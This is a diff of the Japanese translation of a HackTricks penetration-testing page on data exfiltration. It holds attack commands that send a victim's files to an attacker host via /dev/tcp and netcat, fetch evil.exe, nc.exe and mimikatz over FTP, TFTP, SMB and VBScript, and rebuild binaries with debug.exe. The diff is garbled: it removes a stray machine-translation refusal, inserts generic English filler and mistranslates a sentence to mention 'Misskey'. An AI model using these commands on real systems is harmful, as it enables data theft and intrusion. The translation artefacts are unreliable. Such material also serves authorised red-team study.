@@ -1,32 +1,32 @@
-# 情報の流出
+# 情報の外部への持ち出し
 
 <details>
 
-<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>
+<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を通じて、ゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>
 
-HackTricksをサポートする他の方法:
+HackTricks をサポートする他の方法:
 
-* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
-* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
-* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。
+* **HackTricks で企業を宣伝したい**または**HackTricks をPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)で**フォロー**する。
+* **ハッキングテクニックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**
 
 </details>
 
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-攻撃面を追跡し、積極的な脅威スキャンを実行し、APIからウェブアプリ、クラウドシステムまでの技術スタック全体で問題を見つけることで、最も重要な脆弱性を見つけてより早く修正できます。今日[**無料で試す**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。
+最も重要な脆弱性を見つけて修正を迅速化します。Intruder は攻撃対象を追跡し、積極的な脅威スキャンを実行し、APIからWebアプリケーション、クラウドシステムまでの技術スタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 今すぐ。
 
 {% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
 
 ***
 
-## 情報を流出させるためによくホワイトリストに登録されるドメイン
+## 情報を外部に持ち出すための一般的にホワイトリストに登録されているドメイン
 
-悪用可能な一般的にホワイトリストに登録されるドメインを見つけるには、[https://lots-project.com/](https://lots-project.com/) をチェックしてください。
+Misskey で濫用される可能性のある一般的にホワイトリストに登録されているドメインを見つけるには、[https://lots-project.com/](https://lots-project.com/) をチェックしてください
 
-## コピー＆ペースト Base64
+## Base64 をコピー＆ペースト
 
 **Linux**
 ```bash
@@ -122,17 +122,17 @@ app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ```
 ## FTP
 
-### FTPサーバー (python)
+### FTPサーバー（Python）
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-### FTPサーバー (NodeJS)
+### FTPサーバー（NodeJS）
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
-### FTPサーバー (pure-ftp)
+### FTPサーバー（pure-ftp）
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
@@ -161,10 +161,9 @@ echo GET mimikatz.exe >> ftp.txt
 echo bye >> ftp.txt
 ftp -n -v -s:ftp.txt
 ```
-```
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-最も重要な脆弱性を見つけて、より早く修正できるようにします。Intruderは攻撃面を追跡し、積極的な脅威スキャンを実行し、APIからウェブアプリ、クラウドシステムに至るまでの全技術スタックで問題を見つけます。今日[**無料でお試し**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。
+最も重要な脆弱性を見つけて、より速く修正できるようにします。Intruderは攻撃対象を追跡し、積極的な脅威スキャンを実行し、APIからWebアプリやクラウドシステムまで、技術スタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 今すぐ。
 
 {% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
 
@@ -172,15 +171,14 @@ ftp -n -v -s:ftp.txt
 
 ## SMB
 
-Kali as server
-```
+Kaliをサーバーとして
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-または、**sambaを使用して** smb共有を作成します：
+または、Sambaを使用してSMB共有を作成します：
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -195,7 +193,30 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-Since the content you're asking for is not provided, I'm unable to translate it. If you provide the specific English text from the file `generic-methodologies-and-resources/exfiltration.md`, I can then translate it into Japanese for you. Please provide the text you need translated.
+## Exfiltration
+
+### Exfiltration Techniques
+
+Exfiltration techniques are used to **steal** data from a target network. Once an attacker has gained access to a network, they will often need to exfiltrate data without being detected. There are several common exfiltration techniques:
+
+- **Compression**: Data is compressed before exfiltration to reduce its size and avoid detection.
+- **Encryption**: Data is encrypted to prevent detection by security tools.
+- **Steganography**: Data is hidden within other files to avoid detection.
+- **Traffic manipulation**: Attackers manipulate network traffic to exfiltrate data without being detected.
+- **DNS tunneling**: Data is exfiltrated using DNS requests to avoid detection.
+
+### Exfiltration Tools
+
+There are several tools available to help with data exfiltration:
+
+- **Netcat**: A versatile networking utility that can be used for data transfer.
+- **Wget**: A command-line utility for downloading files.
+- **Curl**: Another command-line utility for transferring data with URLs.
+- **FTP**: File Transfer Protocol can be used to exfiltrate data to an external server.
+- **SCP**: Secure Copy Protocol can securely transfer files between hosts.
+- **Rsync**: A utility for efficiently transferring and synchronizing files between systems.
+
+By using these exfiltration techniques and tools, attackers can successfully steal data from a target network without being detected.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -205,38 +226,64 @@ WindPS-2> cd new_disk:
 ```
 ## SCP
 
-攻撃者はSSHdを実行中でなければなりません。
+攻撃者はSSHdを実行している必要があります。
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-被害者がSSHを持っている場合、攻撃者は被害者から攻撃者へディレクトリをマウントすることができます。
+被害者がSSHを持っている場合、攻撃者は被害者から攻撃者にディレクトリをマウントできます。
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
 ## NC
+
+### Data Exfiltration
+
+#### Description
+
+The `nc` command, short for netcat, is a versatile tool that can be used for data exfiltration. It allows for reading and writing data across network connections, making it a valuable asset during a penetration test.
+
+#### Usage
+
+To exfiltrate data using `nc`, you can set up a listener on the receiving end and send data from the target machine to the listener. Here is an example of how to send a file using `nc`:
+
+On the receiving end:
+```bash
+nc -lvp <PORT> > received_file
+```
+
+On the target machine:
+```bash
+nc <RECEIVING_IP> <PORT> < file_to_send
+```
+
+#### Considerations
+
+- Ensure that the port you choose is open and accessible.
+- Encrypt the data if necessary to prevent interception.
+- Be cautious when using `nc` as it can be detected by intrusion detection systems.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### 被害者からファイルをダウンロード
+### 攻撃対象からファイルをダウンロード
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### 被害者にファイルをアップロード
+### 被害者へのファイルアップロード
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-**@BinaryShadow\_** に感謝
+感謝 **@BinaryShadow\_**
 
 ## **ICMP**
 ```bash
@@ -258,37 +305,39 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-SMTPサーバーにデータを送信できる場合、pythonを使用してデータを受信するSMTPを作成できます：
+SMTPサーバーにデータを送信できる場合、Pythonを使用してデータを受信するSMTPを作成できます：
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-デフォルトではXPおよび2003に存在します（他のOSではインストール時に明示的に追加する必要があります）
+XPおよび2003ではデフォルトで有効（他のOSではインストール時に明示的に追加する必要がある）
 
-Kaliでは、**TFTPサーバーを起動**:
+Kaliでは、**TFTPサーバーを起動**します：
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**PythonによるTFTPサーバー:**
+**PythonでのTFTPサーバー:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-**被害者**では、Kaliサーバーに接続します：
+**被害者**で、Kaliサーバーに接続します：
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-PHPのワンライナーでファイルをダウンロードする：
+PHPのワンライナーを使用してファイルをダウンロードします：
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
 ## VBScript
+
+Visual Basic Script (VBScript) は、Microsoft Windows 環境で広く使用されているスクリプト言語です。VBScript を使用して、ファイルをエクスフィルトレーションする方法の一例を以下に示します。
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -326,41 +375,37 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-これはWindows 32ビットマシンで機能する驚くべきテクニックです。`debug.exe`プログラムを使用するというアイデアです。これはバイナリを検査するために使用されるデバッガーのようなものです。しかし、それはヘックスからバイナリを再構築することもできます。つまり、`netcat`のようなバイナリを取り、ヘックスに分解し、侵害されたマシン上のファイルに貼り付け、そして`debug.exe`で組み立てるというわけです。
+これはWindows 32ビットマシンで機能するクレイジーなテクニックです。アイデアは`debug.exe`プログラムを使用することです。これはデバッガのようにバイナリを検査するために使用されます。しかし、16進数から再構築することもできます。したがって、バイナリ（例：`netcat`）を16進数に分解し、それを侵害されたマシン上のファイルに貼り付け、`debug.exe`で組み立てるというアイデアです。
 
-`Debug.exe`は64kbまでしか組み立てることができません。したがって、それ以下のサイズのファイルを使用する必要があります。さらに圧縮するためにupxを使用することができます。それでは、やってみましょう：
+`Debug.exe`は64 kbしか組み立てられません。そのため、それよりも小さいファイルを使用する必要があります。さらに圧縮するためにupxを使用できます。それでは、やってみましょう：
 ```
 upx -9 nc.exe
 ```
-現在、そのサイズは29kbになりました。完璧です。それでは、これを分解しましょう：
+今はたった29 kbしかありません。完璧です。では、これを分解してみましょう：
 ```
 wine exe2bat.exe nc.exe nc.txt
 ```
-```
-これで、テキストをウィンドウズシェルにコピー＆ペーストするだけで、自動的にnc.exeというファイルが作成されます。
-
 ## DNS
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-最も重要な脆弱性を見つけて、より早く修正しましょう。Intruderは攻撃面を追跡し、積極的な脅威スキャンを実行し、APIからウェブアプリ、クラウドシステムに至るまでの技術スタック全体の問題を見つけ出します。今日から[**無料でお試し**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。
+最も重要な脆弱性を見つけて修正を迅速化します。Intruderは攻撃面を追跡し、積極的な脅威スキャンを実行し、APIからWebアプリケーション、クラウドシステムまでの技術スタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 今すぐ。
 
 {% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
 
 
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローになる方法を学びましょう</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!</strong></a></summary>
+<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
 
-HackTricksをサポートする他の方法:
+HackTricksをサポートする他の方法：
 
-* **HackTricksにあなたの会社を広告掲載したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手しましょう。
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックしてください。
-* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加するか**、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローしてください。**
-* [**HackTricks**](https://github.com/carlospolop/hacktricks)や[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを共有してください。
+* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**をフォローする。**
+* **HackTricks**および**HackTricks Cloud**のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。
 
 </details>
-```
